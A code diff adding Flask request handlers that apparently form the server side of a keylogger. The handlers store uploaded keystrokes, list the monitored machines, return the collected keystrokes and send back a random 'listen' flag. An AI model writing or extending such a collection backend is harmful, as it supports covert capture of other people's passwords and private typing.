@@ -1,0 +1,32 @@
+from flask import jsonify
+import services
+import random
+
+def handle_notifications(request):
+    text = request.data.decode("utf-8")
+    if not text:
+        return "No data provided", 400
+    try:
+        services.save_notification(text)
+        return jsonify({"status": "success", "added": text}), 201
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+def handle_upload(request):
+    status_listen = random.randint(0, 1)
+    if not request.is_json:
+        return jsonify({"error": "Request must be JSON"}), 400
+    data = request.get_json()
+    if not data:
+        return jsonify({"data": False, "status_listen": status_listen}), 200
+    try:
+        services.save_keystrokes(data)
+        return jsonify({"data": True, "status_listen": status_listen}), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+def handle_get_machines():
+    return services.get_machines_list()
+
+def handle_get_keystrokes(request):
+    return services.get_keystrokes(request)
